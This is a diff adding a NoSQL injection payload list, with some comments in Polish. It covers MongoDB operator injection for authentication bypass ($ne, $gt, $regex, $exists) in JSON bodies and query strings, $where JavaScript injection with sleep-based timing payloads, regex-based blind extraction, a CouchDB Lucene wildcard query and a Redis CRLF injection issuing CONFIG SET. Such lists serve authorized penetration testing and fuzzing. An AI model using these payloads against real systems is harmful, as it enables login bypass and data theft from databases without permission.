@@ -1,0 +1,37 @@
+# === MongoDB — operator injection (JSON body) ===
+# Auth bypass — $ne (not equal)
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":"admin","password":{"$ne":""}}
+# $gt (greater than)
+{"username":{"$gt":""},"password":{"$gt":""}}
+# $regex
+{"username":"admin","password":{"$regex":".*"}}
+# $exists
+{"username":"admin","password":{"$exists":true}}
+
+# === MongoDB — query string operator injection ===
+# Aplikacja parsuje ?username[$ne]=...
+username[$ne]=foo&password[$ne]=foo
+username[$regex]=^adm&password[$ne]=foo
+username=admin&password[$gt]=
+
+# === MongoDB — JS injection ($where) ===
+{"$where":"this.password=='a'||'1'=='1'"}
+{"username":"admin","$where":"sleep(5000)"}
+';return(true);var x='
+';sleep(5000);var x='
+0;return true
+1;return true
+
+# === Boolean blind extraction ===
+{"username":{"$regex":"^a"},"password":{"$ne":""}}
+{"username":"admin","password":{"$regex":"^a.*"}}
+
+# === CouchDB ===
+# _all_docs disclosure (out of payload scope; konfiguracja)
+# Lucene query injection
+*:*
+
+# === Redis (gdy parametr trafia do CONFIG/EVAL) ===
+# CRLF do Redis (RESP injection)
+%0d%0aCONFIG%20SET%20dir%20/tmp%0d%0a
